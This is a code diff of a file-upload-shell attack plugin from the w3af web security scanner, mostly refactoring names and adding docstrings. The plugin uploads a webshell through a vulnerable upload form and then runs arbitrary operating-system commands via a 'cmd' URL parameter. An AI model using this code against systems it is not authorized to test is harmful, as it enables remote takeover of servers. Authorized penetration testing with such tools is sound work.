@@ -21,7 +21,7 @@ Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 '''
 
 
-from core.data.fuzzer.fuzzer import *
+from core.data.fuzzer.fuzzer import createRandAlNum
 import core.controllers.outputManager as om
 # options
 from core.data.options.option import option
@@ -47,8 +47,10 @@ class fileUploadShell(baseAttackPlugin):
 
     def __init__(self):
         baseAttackPlugin.__init__(self)
-        self._pathName = ''
-        self._fname = ''
+        
+        # Internal variables
+        self._path_name = ''
+        self._file_name = ''
         
         # User configured variables ( for fastExploit )
         self._url = ''
@@ -73,59 +75,73 @@ class fileUploadShell(baseAttackPlugin):
             kb.kb.append( 'fileUpload', 'fileUpload', v )
 
     def getAttackType(self):
+        '''
+        @return: The type of exploit, SHELL, PROXY, etc.
+        '''        
         return 'shell'
 
     def getVulnName2Exploit( self ):
+        '''
+        This method should return the vulnerability name (as saved in the kb) to exploit.
+        For example, if the audit.osCommanding plugin finds an vuln, and saves it as:
+        
+        kb.kb.append( 'osCommanding' , 'osCommanding', vuln )
+        
+        Then the exploit plugin that exploits osCommanding ( attack.osCommandingShell ) should
+        return 'osCommanding' in this method.
+        '''                
         return 'fileUpload'
                 
-    def _generateShell( self, vuln ):
+    def _generateShell( self, vuln_obj ):
         '''
-        @parameter vuln: The vuln to exploit.
+        @parameter vuln_obj: The vuln to exploit.
         @return: True is a shell object based on the param vuln was created ok.
         '''
         # Check if we really can execute commands on the remote server
-        if self._verifyVuln( vuln ):
+        if self._verifyVuln( vuln_obj ):
             
             # Set shell parameters
-            s = fuShell( vuln )
-            s.setUrlOpener( self._urlOpener )
-            s.setExploitURL( self._exploit )
-            return s
+            shell_obj = fuShell( vuln_obj )
+            shell_obj.setUrlOpener( self._urlOpener )
+            shell_obj.setExploitURL( self._exploit )
+            return shell_obj
         else:
             return None
 
-    def _verifyVuln( self, vuln ):
+    def _verifyVuln( self, vuln_obj ):
         '''
         This command verifies a vuln. This is really hard work! :P
-
+        
+        @parameter vuln_obj: The vuln to exploit.
         @return : True if vuln can be exploited.
         '''
         # The vuln was saved to the kb as a vuln object
-        url = vuln.getURL()
-        method = vuln.getMethod()
-        exploitQs = vuln.getDc()
+        url = vuln_obj.getURL()
+        method = vuln_obj.getMethod()
+        exploit_qs = vuln_obj.getDc()
 
         # Create a file that will be uploaded
         extension = urlParser.getExtension( url )
         fname = self._createFile( extension )
-        fd = open( fname , "r")
+        file_handler = open( fname , "r")
         
         # Upload the file
-        for f in vuln['fileVars']:
-            exploitQs[f] = fd
-        response = self._urlOpener.POST( vuln.getURL() ,  exploitQs )
+        for file_var_name in vuln_obj['fileVars']:
+            exploit_qs[file_var_name] = file_handler
+        http_method = getattr( self._urlOpener,  method)
+        response = http_method( vuln_obj.getURL() ,  exploit_qs )
         
-        dst = vuln['fileDest']
-        rnd = createRandAlNum( 8 )
-        cmd = 'echo+%22' + rnd + '%22'
+        # Call the uploaded script with an empty value in cmd parameter
+        # this will return the getShell.SHELL_IDENTIFIER if success
+        dst = vuln_obj['fileDest']
+        self._exploit = urlParser.getDomainPath( dst ) + self._file_name + '?cmd='
+        response = self._urlOpener.GET( self._exploit )
         
-        self._exploit = urlParser.getDomainPath( dst ) + self._fname + '?cmd='
-        toSend = urlParser.getDomainPath( dst ) + self._fname + '?cmd=' + cmd
+        # Clean-up
+        file_handler.close()
+        os.remove( self._path_name )
         
-        fd.close()
-        os.remove( self._pathName )
-        response = self._urlOpener.GET( toSend )
-        if response.getBody().count( rnd ):
+        if getShell.SHELL_IDENTIFIER in response.getBody():
             return True
         else:
             return False
@@ -142,22 +158,22 @@ class fileUploadShell(baseAttackPlugin):
         except:
             raise w3afException('Could not create '+ dir + ' directory.')
         
-        fileContent, realExtension = getShell.getShell( extension, forceExtension=True )[0]
+        file_content, real_extension = getShell.getShell( extension, forceExtension=True )[0]
         if extension == '':
-            extension = realExtension
+            extension = real_extension
             
         fname = createRandAlNum( 8 ) + '.' +extension
-        self._pathName = dir + fname
-        self._fname = fname
-        fd = None
+        self._path_name = dir + fname
+        self._file_name = fname
+        file_handler = None
         try:
-            fd = file(  self._pathName , 'w' )
+            file_handler = file(  self._path_name , 'w' )
         except:
-            raise w3afException('Could not create file: ' + self._pathName )
+            raise w3afException('Could not create file: ' + self._path_name )
         
-        fd.write( fileContent )
-        fd.close()
-        return self._pathName
+        file_handler.write( file_content )
+        file_handler.close()
+        return self._path_name
     
     def getOptions( self ):
         '''
@@ -243,19 +259,19 @@ class fuShell(shell):
         @parameter command: The command to send ( ie. "ls", "whoami", etc ).
         @return: The result of the command.
         '''
-        toSend = self.getExploitURL() + urllib.quote_plus( command )
-        response = self._urlOpener.GET( toSend )
+        to_send = self.getExploitURL() + urllib.quote_plus( command )
+        response = self._urlOpener.GET( to_send )
         return response.getBody()
         
     def end( self ):
         om.out.debug('File upload shell is going to delete the webshell that was uploaded before.')
-        fileToDel = urlParser.getFileName( self.getExploitURL() )
+        file_to_del = urlParser.getFileName( self.getExploitURL() )
         try:
-            self.removeFile(fileToDel)
+            self.removeFile(file_to_del)
         except w3afException, e:
             om.out.error('File upload shell cleanup failed with exception: ' + str(e) )
         else:
-            om.out.debug('File upload shell cleanup complete; successfully removed file: "' + fileToDel + '"')
+            om.out.debug('File upload shell cleanup complete; successfully removed file: "' + file_to_del + '"')
     
     def getName( self ):
         return 'fileUploadShell'
